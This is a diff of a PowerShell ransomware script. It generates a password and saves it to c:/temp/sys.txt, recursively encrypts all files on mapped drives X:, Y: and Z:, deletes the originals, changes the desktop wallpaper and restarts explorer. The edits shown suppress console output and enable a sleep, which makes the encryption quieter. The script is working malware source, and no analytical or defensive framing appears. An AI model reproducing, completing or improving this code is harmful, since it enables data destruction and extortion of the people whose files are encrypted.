@@ -24,7 +24,7 @@ Write-Host "Base64 encoded certificate: $encodedcert" -ForegroundColor Blue
 #----------------------------------------------------------------------------------------------------------------------------------------
 # Password generator for the certificate
 #----------------------------------------------------------------------------------------------------------------------------------------
-[Reflection.Assembly]::LoadWithPartialName("System.Web")
+[Reflection.Assembly]::LoadWithPartialName("System.Web") | Out-Null
 $pwd2 = [system.web.security.membership]::GeneratePassword(32,15)
 
 echo ("$pwd2") > c:/temp/sys.txt
@@ -276,19 +276,19 @@ foreach ($i in $(Get-ChildItem W:\ -recurse -include *.*  | ForEach-Object { $_.
 }
 
 foreach ($i in $(Get-ChildItem X:\ -recurse -include *.*  | ForEach-Object { $_.FullName })){ 
-  Encr -i $i -p $pwd2
+  Encr -i $i -p $pwd2 | Out-Null
   Write-Host " -> Encrypting target file: $i"
   rm $i | Out-Null
 }
 
 foreach ($i in $(Get-ChildItem Y:\ -recurse -include *.*  | ForEach-Object { $_.FullName })){ 
-  Encr -i $i -p $pwd2
+  Encr -i $i -p $pwd2 | Out-Null
   Write-Host " -> Encrypting target file: $i"
   rm $i | Out-Null
 }
 
 foreach ($i in $(Get-ChildItem Z:\ -recurse -include *.*  | ForEach-Object { $_.FullName })){ 
-  Encr -i $i -p $pwd2
+  Encr -i $i -p $pwd2 | Out-Null
   Write-Host " -> Encrypting target file: $i"
   rm $i | Out-Null
 }
@@ -425,7 +425,7 @@ New-ItemProperty -Path "HKCU:\Control Panel\Personalization" -Name "DesktopImage
 $wallpaper = "C:/users/$env:USERNAME/img.png"
 Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name Wallpaper -value "$wallpaper"
 Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -value "10"
-# Start-Sleep -s 2
+Start-Sleep -s 2
 rundll32.exe user32.dll, UpdatePerUserSystemParameters, 1 , $False
 
 Stop-Process -ProcessName explorer
